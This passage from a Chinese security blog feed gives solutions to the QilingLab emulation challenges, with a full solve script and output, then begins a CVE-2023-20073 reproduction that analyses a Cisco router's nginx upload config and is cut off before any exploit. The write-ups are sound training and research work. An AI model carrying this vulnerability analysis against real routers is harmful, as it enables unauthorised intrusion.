class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><h3 id="challenge10"><a href="#challenge10" class="headerlink" title="challenge10"></a>challenge10</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge10</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">read</span>(fd, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">close</span>(fd);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !buf[i] )</span><br><span class="line">          buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[v4] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;qilinglab&quot;</span>) )</span><br><span class="line">        *a1 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想法就是hook掉strcmp，但是上个challenge已经成功hook掉strcmp了，因此就劫持cmdline成一个结构体，直接返回qilinglab即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br></pre></td></tr></table></figure><h3 id="challenge11"><a href="#challenge11" class="headerlink" title="challenge11"></a>challenge11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001195 89 75 D0                      mov     [rbp+var_30], esi</span><br><span class="line">.text:0000000000001198 89 4D CC                      mov     [rbp+var_34], ecx</span><br><span class="line">.text:000000000000119B 89 45 D4                      mov     [rbp+var_2C], eax</span><br><span class="line">.text:000000000000119E 81 7D D0 51 69 6C 69          cmp     [rbp+var_30], 696C6951h</span><br><span class="line">.text:00000000000011A5 75 19                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011A5</span><br><span class="line">.text:00000000000011A7 81 7D CC 6E 67 4C 61          cmp     [rbp+var_34], 614C676Eh</span><br><span class="line">.text:00000000000011AE 75 10                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011AE</span><br><span class="line">.text:00000000000011B0 81 7D D4 62 20 20 20          cmp     [rbp+var_2C], 20202062h</span><br><span class="line">.text:00000000000011B7 75 07                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011B7</span><br><span class="line">.text:00000000000011B9 48 8B 45 B8                   mov     rax, [rbp+var_48]</span><br><span class="line">.text:00000000000011BD C6 00 01                      mov     byte ptr [rax], 1</span><br></pre></td></tr></table></figure><p>就是让esi&#x3D;&#x3D;696C6951h &amp;&amp; ecx&#x3D;&#x3D;614C676Eh &amp;&amp; eax&#x3D;20202062h，就可以解决了，所以直接hook掉1195，使得这些寄存器为相应的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br></pre></td></tr></table></figure><p>如此便解决了所有的挑战</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.mem.<span class="built_in">map</span>(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span><br><span class="line">ql.mem.write(<span class="number">0x1337</span>, <span class="string">b&quot;\x39\x05&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_uname_ret</span>(<span class="params">ql ,*args</span>): </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct utsname</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        char sysname[65];</span></span><br><span class="line"><span class="string">        char nodename[65];</span></span><br><span class="line"><span class="string">        char release[65];</span></span><br><span class="line"><span class="string">        char version[65];</span></span><br><span class="line"><span class="string">        char machine[65];</span></span><br><span class="line"><span class="string">        char domainname[65];</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rdi_value=ql.arch.regs.read(<span class="string">&quot;rdi&quot;</span>)</span><br><span class="line">ql.mem.write(rdi_value,<span class="string">b&#x27;QilingOS\x00&#x27;</span>)</span><br><span class="line">ql.mem.write(rdi_value+<span class="number">65</span>*<span class="number">3</span>,<span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;uname&quot;</span>,my_uname_ret,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">ql = Qiling([<span class="string">r&quot;qilinglab-x86_64&quot;</span>], <span class="string">r&#x27;./qiling/examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.OFF)</span><br><span class="line"><span class="comment">#ql.verbose = 0</span></span><br><span class="line"><span class="comment">#ql.debugger = &quot;gdb:0.0.0.0:9999&quot;</span></span><br><span class="line"><span class="comment">#base_addr = ql.mem.get_lib_base(ql.path)</span></span><br><span class="line"><span class="comment">#ql.hook_address(win, base_addr + 0x12C5) </span></span><br><span class="line">challenge1(ql)</span><br><span class="line">challenge2(ql)</span><br><span class="line">challenge3(ql)</span><br><span class="line">challenge4(ql)</span><br><span class="line">challenge5(ql)</span><br><span class="line">challenge6(ql)</span><br><span class="line">challenge7(ql)</span><br><span class="line">challenge8(ql)</span><br><span class="line">challenge9(ql)</span><br><span class="line">challenge10(ql)</span><br><span class="line">challenge11(ql)</span><br><span class="line">ql.run()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">s1nec-1o@s1nec1o:~/Qiling$ python3 solve.py </span><br><span class="line">Welcome to QilingLab.</span><br><span class="line">Here is the list of challenges:</span><br><span class="line">Challenge 1: Store 1337 at pointer 0x1337.</span><br><span class="line">Challenge 2: Make the &#x27;uname&#x27; syscall return the correct values.</span><br><span class="line">Challenge 3: Make &#x27;/dev/urandom&#x27; and &#x27;getrandom&#x27; &quot;collide&quot;.</span><br><span class="line">Challenge 4: Enter inside the &quot;forbidden&quot; loop.</span><br><span class="line">Challenge 5: Guess every call to rand().</span><br><span class="line">Challenge 6: Avoid the infinite loop.</span><br><span class="line">Challenge 7: Don&#x27;t waste time waiting for &#x27;sleep&#x27;.</span><br><span class="line">Challenge 8: Unpack the struct and write at the target address.</span><br><span class="line">Challenge 9: Fix some string operation to make the iMpOsSiBlE come true.</span><br><span class="line">Challenge 10: Fake the &#x27;cmdline&#x27; line file to return the right content.</span><br><span class="line">Challenge 11: Bypass CPUID/MIDR_EL1 checks.</span><br><span class="line"></span><br><span class="line">Checking which challenge are solved...</span><br><span class="line">Note: Some challenges will results in segfaults and infinite loops if they aren&#x27;t solved.</span><br><span class="line"></span><br><span class="line">Challenge 1: SOLVED</span><br><span class="line">Challenge 2: SOLVED</span><br><span class="line">Challenge 3: SOLVED</span><br><span class="line">Challenge 4: SOLVED</span><br><span class="line">Challenge 5: SOLVED</span><br><span class="line">Challenge 6: SOLVED</span><br><span class="line">[*] debug1 0x55555575a690</span><br><span class="line">[*] debug2 0x3dfcd6ea00000539</span><br><span class="line">[*] debug3 0x80000000dd54</span><br><span class="line">Challenge 7: SOLVED</span><br><span class="line">Challenge 8: SOLVED</span><br><span class="line">Challenge 9: SOLVED</span><br><span class="line">Challenge 10: SOLVED</span><br><span class="line">Challenge 11: SOLVED</span><br><span class="line">You solved 11/11 of the challenges</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;做完这些lab，对qiling的作用，这个framework的理解，更加的深，希望看到这里的读者可以自己去做一遍，不要纯看他人的wp，因为每</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Qiling" scheme="http://s1nec-1o.github.io/tags/Qiling/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-20073复现</title>
    <link href="http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-08-11T15:30:17.000Z</published>
    <updated>2024-08-11T15:32:00.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-20073"><a href="#CVE-2023-20073" class="headerlink" title="CVE-2023-20073"></a>CVE-2023-20073</h1><h1 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h1><p>首先在官网下载对应版本的<a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29">固件</a>，之后binwalk -Me解压，但是会出现一个问题，便是因为其软连接指向的是他的文件系统根目录下的，而当前根目录是我们的主机，想来也不会让其随便的建立软连接，他又只是一个机器，因此无法自己指向自己的根目录下，那我们只好再次自己去解压</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331139.png" alt="image-20240811213143133"></p><p>在这个目录下执行 <code>ubi_reader 0.ubi</code>，但是我本身拥有这个ubi_reader，是从binwalk源码下载的，他自己却不能一次binwalk解压成功，确实让人匪夷所思，可能是要多加一些什么参数吧</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><h2 id="配置文件分析"><a href="#配置文件分析" class="headerlink" title="配置文件分析"></a>配置文件分析</h2><p>首先在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;目录下有很多nginx的配置模块</p><p>首先看&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;rest.url.conf</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331141.png" alt="image-20240811131431353"></p><p>看到它分为五个模块，其中主要看第三个模块，即文件上传模块</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">location /api/operations/ciscosb-file:form-file-upload &#123;</span><br><span class="line">set $deny <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($deny 